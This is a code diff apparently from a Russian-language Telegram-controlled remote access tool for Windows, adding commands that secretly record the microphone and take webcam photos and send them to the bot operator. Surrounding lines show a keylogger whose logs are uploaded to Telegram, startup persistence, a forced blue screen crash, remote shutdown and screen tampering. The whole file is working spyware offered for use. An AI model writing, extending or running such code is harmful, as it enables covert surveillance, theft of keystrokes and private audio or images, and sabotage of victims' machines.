@@ -39,12 +39,35 @@ from ctypes import *
 import win32api
 import win32gui
 import win32con
+# Делает фото CV2
+import cv2
+# Запись звука
+import sounddevice as sd
+from scipy.io.wavfile import write
+import wavio as wv
+from multiprocessing import Process
 
+def micro_phone(i):
+    # Sampling frequency
+    freq = 44100
+    # Recording duration
+    duration = int(i * freq)
+    # Start recorder with the given values
+    # of duration and sample frequency
+    recording = sd.rec(duration,
+                       samplerate=freq, channels=2)
 
+    # Record audio for the given number of seconds
+    sd.wait()
+    # This will convert the NumPy array to an audio
+    # file with the given sampling frequency
+    write("recorded.wav", freq, recording)
+    # Convert the NumPy array to audio file
+    wv.write("recorded.wav", recording, freq, sampwidth=2)
 
-
-bot = telebot.TeleBot('YOUR TOKEN')
-
+def send_audio(bot, chat_id):
+    with open("recorded.wav", "rb") as f:
+        bot.send_document(chat_id, f)
 
 
 # # Получаем путь к исполняемому файлу текущего скрипта
@@ -88,6 +111,29 @@ add_to_startup()
 # if check_running():
 #     print('Бот уже запущен')
 #     exit()
+
+# Функция записи звука с микрофона
+def micro_phone(i):
+    # Sampling frequency
+    freq = 44100
+
+    # Recording duration
+    duration = i
+
+    # Start recorder with the given values
+    # of duration and sample frequency
+    recording = sd.rec(int(duration * freq),
+                       samplerate=freq, channels=2)
+
+    # Record audio for the given number of seconds
+    sd.wait()
+
+    # This will convert the NumPy array to an audio
+    # file with the given sampling frequency
+    write("recorded.wav", freq, recording)
+
+    # Convert the NumPy array to audio file
+    wv.write("recorded.wav", recording, freq, sampwidth=2)
 
 
 def setEngLayout():
@@ -138,6 +184,10 @@ def Keylogs():
         logger.main()
         # input()
 
+#YOUR_TOKEN
+bot = telebot.TeleBot('YOUR_TOREN')
+
+
 
 @bot.message_handler(commands=['keylog'])
 def website(message):
@@ -165,8 +215,9 @@ def My_PC(message):
 11. Узнать инфу о пк - /info
 12. Закрыть какой-то процесс - /kill_process + cmd.exe и тд.
 13. Открыть сайт по ссылке - /sites (https://....)
-14. Синий экран смерти - /blue_screen\</b>''')
-    
+14. Синий экран смерти - /blue_screen
+15. Запись с микрофона - /microo
+16. Сделать фото с камеры - /web_camera</b>''')
     bot.send_message(message.chat.id, text, parse_mode='html')
 
     bot.send_message(message.chat.id, "Создание папки где будет лежить keyloger")
@@ -340,6 +391,16 @@ pause'''
         bot.send_message(message.chat.it, "Error")
 
 
+@bot.message_handler(commands=['microo'])
+def mecro(message):
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
+    sec_5 = types.KeyboardButton("5_sec")
+    sec_10 = types.KeyboardButton("10_sec")
+    sec_15 = types.KeyboardButton("15_sec")
+    sec_20 = types.KeyboardButton("20_sec")
+    markup.add(sec_5, sec_10, sec_15, sec_20)
+    bot.send_message(message.chat.id, 'Сколько будет записываться звук с микро ', reply_markup=markup)
+
 
 @bot.message_handler(commands=['password'])
 def password(message):
@@ -425,6 +486,27 @@ def reboot(message):
     os.system("shutdown /s /t 0")
 
 
+@bot.message_handler(commands=['web_camera'])
+def camera(message):
+    try:
+        cap = cv2.VideoCapture(0)
+
+        for i in range(30):
+            cap.read()
+
+        ret, frame = cap.read()
+        cv2.imwrite('photo.png', frame)
+        cap.release()
+        time.sleep(1)
+        _logo1 = open("photo.png", "rb")
+        bot.send_document(message.chat.id, _logo1)
+        time.sleep(1)
+        os.remove('photo.png')
+
+    except:
+        bot.send_message(message.chat.id, 'Ошибка кажется нету камеры')
+
+
 @bot.message_handler(commands=["restart"])
 def start(message):
     text = 'Перезапуск'
@@ -441,6 +523,9 @@ def wifi(message):
         bot.send_message(message.chat.id, "Ошибка")
 
 
+
+
+
 i = 0
 
 def play_music(file):
@@ -452,205 +537,272 @@ def play_music(file):
 
 @bot.message_handler(content_types=['text'])
 def get_user_text(message):
-    global i
+    try:
+        global i
 
 
-    #работа кейлогера
-    if message.text == 'start keylog':
-        bot.send_message(message.chat.id, "Кейлогер Запущен")
-        Keylogs()
-        time.sleep(1)
-        pyautogui.write('t')
-
-
-    if message.text == "stop keylog":
-        try:
-            logo = open("C:\\Users\\Public\\logs.txt", "rb")
-
-            bot.send_document(message.chat.id, logo)
-
-        except:
-            bot.send_message(message.chat.id, "Какая та ошибка")
-
-    #инициализация
-    pythoncom.CoInitialize()
-
-    # загрузка и воспроизведение а также изменение громкости
-    if message.text.startswith("https://"):
-        try:
-            markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
-            stop = types.KeyboardButton("stop_sound")
-            hungred = types.KeyboardButton("set_sound_100%")
-            fifty = types.KeyboardButton("set_sound_50%")
-            twenty_five = types.KeyboardButton("set_sound_25%")
-            ten = types.KeyboardButton("set_sound_10%")
-            zero = types.KeyboardButton("set_sound_0%")
-            blue_screen = types.KeyboardButton("Синька")
-            markup.add(stop, hungred, fifty, twenty_five, ten, zero, blue_screen)
-            bot.send_message(message.chat.id, 'Изминить громкость', reply_markup=markup)
-
-            url = message.text
-            urllib.request.urlretrieve(url, "file" + str(i) + ".mp3")
-            bot.send_message(message.chat.id, "Идёт загрузка", parse_mode='html')
-            bot.send_message(message.chat.id, "3", parse_mode='html')
+        #работа кейлогера
+        if message.text == 'start keylog':
+            bot.send_message(message.chat.id, "Кейлогер Запущен")
+            Keylogs()
             time.sleep(1)
-            bot.send_message(message.chat.id, "2", parse_mode='html')
-            time.sleep(1)
-            bot.send_message(message.chat.id, "1", parse_mode='html')
-            time.sleep(1)
-            bot.send_message(message.chat.id, "0", parse_mode='html')
+            pyautogui.write('t')
 
-            pygame.init()
 
-            # Загрузка и игра музыки
-            pygame.mixer.music.load("file" + str(i) + ".mp3")
-            i = i + 1
-
-            print(i)
-            pygame.mixer.music.play()
-
-            # Установка пользовательского события для окончания музыки
-            MUSIC_END = pygame.USEREVENT + 1
-            pygame.mixer.music.set_endevent(MUSIC_END)
-
-        except:
-            bot.send_message(message.chat.it, "Error кажется файл не mp3 или ссылка не рабочая ")
-
-    elif message.text == "stop_sound":
-        try:
-            bot.send_message(message.chat.id, "Выклчение музыки")
-            pygame.quit()
-            bot.send_message(message.chat.id, "OK")
-            bot.send_message(message.chat.id, "Удаление музыки")
-            os.remove("file" + str(i) + ".mp3")
-            bot.send_message(message.chat.id, "OK")
-
-        except:
-            pygame.quit()
-            bot.send_message(message.chat.id, "Error может быть файл mp3 не работает")
+        if message.text == "stop keylog":
             try:
-                bot.send_message(message.chat.id, "Удаление mp3")
+                logo = open("C:\\Users\\Public\\logs.txt", "rb")
+
+                bot.send_document(message.chat.id, logo)
+
+            except:
+                bot.send_message(message.chat.id, "Какая та ошибка")
+
+        #инициализация
+        pythoncom.CoInitialize()
+
+        # загрузка и воспроизведение а также изменение громкости
+        if message.text.startswith("https://"):
+            try:
+                markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
+                stop = types.KeyboardButton("stop_sound")
+                hungred = types.KeyboardButton("set_sound_100%")
+                fifty = types.KeyboardButton("set_sound_50%")
+                twenty_five = types.KeyboardButton("set_sound_25%")
+                ten = types.KeyboardButton("set_sound_10%")
+                zero = types.KeyboardButton("set_sound_0%")
+                blue_screen = types.KeyboardButton("Синька")
+                markup.add(stop, hungred, fifty, twenty_five, ten, zero, blue_screen)
+                bot.send_message(message.chat.id, 'Изминить громкость', reply_markup=markup)
+
+                url = message.text
+                urllib.request.urlretrieve(url, "file" + str(i) + ".mp3")
+                bot.send_message(message.chat.id, "Идёт загрузка", parse_mode='html')
+                bot.send_message(message.chat.id, "3", parse_mode='html')
+                time.sleep(1)
+                bot.send_message(message.chat.id, "2", parse_mode='html')
+                time.sleep(1)
+                bot.send_message(message.chat.id, "1", parse_mode='html')
+                time.sleep(1)
+                bot.send_message(message.chat.id, "0", parse_mode='html')
+
+                pygame.init()
+
+                # Загрузка и игра музыки
+                pygame.mixer.music.load("file" + str(i) + ".mp3")
+                i = i + 1
+
+                print(i)
+                pygame.mixer.music.play()
+
+                # Установка пользовательского события для окончания музыки
+                MUSIC_END = pygame.USEREVENT + 1
+                pygame.mixer.music.set_endevent(MUSIC_END)
+
+            except:
+                bot.send_message(message.chat.it, "Error кажется файл не mp3 или ссылка не рабочая ")
+
+        elif message.text == "stop_sound":
+            try:
+                bot.send_message(message.chat.id, "Выклчение музыки")
+                pygame.quit()
+                bot.send_message(message.chat.id, "OK")
+                bot.send_message(message.chat.id, "Удаление музыки")
                 os.remove("file" + str(i) + ".mp3")
                 bot.send_message(message.chat.id, "OK")
+
             except:
-                bot.send_message(message.chat.id,"Не удалось удалить файл mp3")
+                pygame.quit()
+                bot.send_message(message.chat.id, "Error может быть файл mp3 не работает")
+                try:
+                    bot.send_message(message.chat.id, "Удаление mp3")
+                    os.remove("file" + str(i) + ".mp3")
+                    bot.send_message(message.chat.id, "OK")
+                except:
+                    bot.send_message(message.chat.id,"Не удалось удалить файл mp3")
 
 
-    elif message.text == "script_bat":
-        os.system("script.bat")
-        bot.send_message(message.chat.id, "Всё заробило")
+        elif message.text == "script_bat":
+            os.system("script.bat")
+            bot.send_message(message.chat.id, "Всё заробило")
 
 
-    elif message.text == "start https://youareanidiot.cc/":
-        os.system("start https://youareanidiot.cc/")
-        bot.send_message(message.chat.id, "OK")
+        elif message.text == "start https://youareanidiot.cc/":
+            os.system("start https://youareanidiot.cc/")
+            bot.send_message(message.chat.id, "OK")
 
-    #управление громкостью 0%, 25%, 50%, 100%
-    #100%
-    elif message.text == "set_sound_100%":
-        devices = AudioUtilities.GetSpeakers()
-        interface = devices.Activate(
-        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-        volume = cast(interface, POINTER(IAudioEndpointVolume))
+        #управление громкостью 0%, 25%, 50%, 100%
+        #100%
+        elif message.text == "set_sound_100%":
+            devices = AudioUtilities.GetSpeakers()
+            interface = devices.Activate(
+            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+            volume = cast(interface, POINTER(IAudioEndpointVolume))
 
-        volume.SetMasterVolumeLevel(-0.0, None)
+            volume.SetMasterVolumeLevel(-0.0, None)
 
-    # 50%
-    elif message.text == "set_sound_50%":
-        devices = AudioUtilities.GetSpeakers()
-        interface = devices.Activate(
-        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-        volume = cast(interface, POINTER(IAudioEndpointVolume))
+        # 50%
+        elif message.text == "set_sound_50%":
+            devices = AudioUtilities.GetSpeakers()
+            interface = devices.Activate(
+            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+            volume = cast(interface, POINTER(IAudioEndpointVolume))
 
-        volume.SetMasterVolumeLevel(-9.2, None)
+            volume.SetMasterVolumeLevel(-9.2, None)
 
-    # 25%
-    elif message.text == "set_sound_25%":
-        devices = AudioUtilities.GetSpeakers()
-        interface = devices.Activate(
-        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-        volume = cast(interface, POINTER(IAudioEndpointVolume))
+        # 25%
+        elif message.text == "set_sound_25%":
+            devices = AudioUtilities.GetSpeakers()
+            interface = devices.Activate(
+            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+            volume = cast(interface, POINTER(IAudioEndpointVolume))
 
-        volume.SetMasterVolumeLevel(-17.7, None)
+            volume.SetMasterVolumeLevel(-17.7, None)
 
-    # 10%
-    elif message.text == "set_sound_10%":
-        devices = AudioUtilities.GetSpeakers()
-        interface = devices.Activate(
-        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-        volume = cast(interface, POINTER(IAudioEndpointVolume))
+        # 10%
+        elif message.text == "set_sound_10%":
+            devices = AudioUtilities.GetSpeakers()
+            interface = devices.Activate(
+            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+            volume = cast(interface, POINTER(IAudioEndpointVolume))
 
-        volume.SetMasterVolumeLevel(-26.0, None)
+            volume.SetMasterVolumeLevel(-26.0, None)
 
-    # 0%
-    elif message.text == "set_sound_0%":
-        devices = AudioUtilities.GetSpeakers()
-        interface = devices.Activate(
-        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-        volume = cast(interface, POINTER(IAudioEndpointVolume))
+        # 0%
+        elif message.text == "set_sound_0%":
+            devices = AudioUtilities.GetSpeakers()
+            interface = devices.Activate(
+            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+            volume = cast(interface, POINTER(IAudioEndpointVolume))
 
-        volume.SetMasterVolumeLevel(-37.0, None)
+            volume.SetMasterVolumeLevel(-37.0, None)
 
 
-    #поворот экрана
-    elif message.text == "Обратно":
-        screen = rotatescreen.get_primary_display()
-        screen.rotate_to(0)
+        #поворот экрана
+        elif message.text == "Обратно":
+            screen = rotatescreen.get_primary_display()
+            screen.rotate_to(0)
 
-    elif message.text == "Перевернть":
-        screen = rotatescreen.get_primary_display()
-        screen.rotate_to(180)
+        elif message.text == "Перевернть":
+            screen = rotatescreen.get_primary_display()
+            screen.rotate_to(180)
 
-    elif message.text == "Право":
-        screen = rotatescreen.get_primary_display()
-        screen.rotate_to(270)
+        elif message.text == "Право":
+            screen = rotatescreen.get_primary_display()
+            screen.rotate_to(270)
 
-    elif message.text == "Лево":
-        screen = rotatescreen.get_primary_display()
-        screen.rotate_to(90)
+        elif message.text == "Лево":
+            screen = rotatescreen.get_primary_display()
+            screen.rotate_to(90)
 
-    #синий экран смерти
-    elif message.text == 'Синька':
-        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
-        ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6)
+        #синий экран смерти
+        elif message.text == 'Синька':
+            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+            ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6)
 
-    #открытие сайтов
-    #YouTube
-    elif message.text == "start https://www.youtube.com/":
-        os.system("start https://www.youtube.com/")
+        #открытие сайтов
+        #YouTube
+        elif message.text == "start https://www.youtube.com/":
+            os.system("start https://www.youtube.com/")
 
-    #TikTok
-    elif message.text == "start https://www.tiktok.com":
-        os.system("start https://www.tiktok.com")
+        #TikTok
+        elif message.text == "start https://www.tiktok.com":
+            os.system("start https://www.tiktok.com")
 
-    #steam
-    elif message.text == "start https://steamcommunity.com/":
-        os.system("start https://steamcommunity.com/")
+        #steam
+        elif message.text == "start https://steamcommunity.com/":
+            os.system("start https://steamcommunity.com/")
 
-    #powershell
-    elif message.text == "start powershell":
-        os.system("start powershell")
+        #powershell
+        elif message.text == "start powershell":
+            os.system("start powershell")
 
-    #cmd
-    elif message.text == "start cmd":
-        os.system("start cmd")
+        #cmd
+        elif message.text == "start cmd":
+            os.system("start cmd")
 
-    #Проводник
-    elif message.text == "start explorer":
-        os.system("start explorer")
+        #Проводник
+        elif message.text == "start explorer":
+            os.system("start explorer")
 
-    #Выключить монитор
-    elif message.text == "Выкл Монитор":
-        win32gui.SendMessage(win32con.HWND_BROADCAST,
-                             win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, 2)
+        #Выключить монитор
+        elif message.text == "Выкл Монитор":
+            win32gui.SendMessage(win32con.HWND_BROADCAST,
+                                 win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, 2)
 
-    #Включить монитор
-    elif message.text == "Вкл Монитор":
-        win32gui.SendMessage(win32con.HWND_BROADCAST,
-                             win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, -1)
+        #Включить монитор
+        elif message.text == "Вкл Монитор":
+            win32gui.SendMessage(win32con.HWND_BROADCAST,
+                                 win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, -1)
 
-    else:
-        bot.send_message(message.chat.id, "Такой команды нету напишите /help")
+        #from multiprocessing import Process
+
+        # Функция записи звука с микрофона
+
+
+
+        # Запись звука с микрофона
+        # На 5 секкунд
+        elif message.text == "5_sec":
+            try:
+                bot.send_message(message.chat.id, 'Запись с микро на 5 секунд')
+                micro_phone(5)
+                time.sleep(7)
+                bot.send_message(message.chat.id, "Вот на лови")
+                send_audio(bot, message.chat.id)
+            except:
+                bot.send_message(message.chat.id, 'Error')
+
+        # На 10 секкунд
+        elif message.text == "10_sec":
+            try:
+                bot.send_message(message.chat.id, 'Запись с микро на 10 секунд')
+                micro_phone(10)
+                time.sleep(12)
+                bot.send_message(message.chat.id, "Вот на лови")
+                send_audio(bot, message.chat.id)
+            except:
+                bot.send_message(message.chat.id, 'Error')
+
+        # На 15 секкунд
+        elif message.text == "15_sec":
+            try:
+                bot.send_message(message.chat.id, 'Запись с микро на 15 секунд')
+                micro_phone(15)
+                time.sleep(17)
+                bot.send_message(message.chat.id, "Вот на лови")
+                send_audio(bot, message.chat.id)
+
+            except:
+                bot.send_message(message.chat.id, 'Error')
+
+        # На 20 секкунд
+        elif message.text == "20_sec":
+            try:
+                bot.send_message(message.chat.id, 'Запись с микро на 20 секунд')
+                micro_phone(20)
+                time.sleep(22)
+                bot.send_message(message.chat.id, "Вот на лови")
+                send_audio(bot, message.chat.id)
+
+            except:
+                bot.send_message(message.chat.id, 'Error')
+
+        elif message.text == "30_sec":
+            try:
+                bot.send_message(message.chat.id, 'Запись с микро на 30 секунд')
+                micro_phone(20)
+                time.sleep(22)
+                bot.send_message(message.chat.id, "Вот на лови")
+                send_audio(bot, message.chat.id)
+            except:
+                bot.send_message(message.chat.id, 'Error')
+
+        else:
+            bot.send_message(message.chat.id, "Такой команды нету напишите /help")
+
+    except:
+        bot.send_message(message.chat.id, 'Error')
 
 
 
